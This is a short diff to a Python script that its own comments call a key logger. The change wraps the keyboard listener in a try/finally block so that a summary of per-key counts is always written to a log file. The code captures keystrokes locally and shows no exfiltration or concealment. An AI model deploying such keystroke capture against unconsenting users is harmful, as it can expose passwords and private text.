@@ -80,12 +80,13 @@ def on_release(key):
         return False  # Stop listener
 
 
-# Start the key logger
-with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
-
-# Log summary at the end of the session
-with open(file_log, 'a') as log_file:
-    log_file.write("\n=== Session Summary ===\n")
-    for key, count in key_count.items():
-        log_file.write(f'Key: {key}, Count: {count}\n')
+try:
+    # Start the key logger
+    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+finally:
+    # Log summary at the end of the session
+    with open(file_log, 'a') as log_file:
+        log_file.write("\n=== Session Summary ===\n")
+        for key, count in key_count.items():
+            log_file.write(f'Key: {key}, Count: {count}\n')
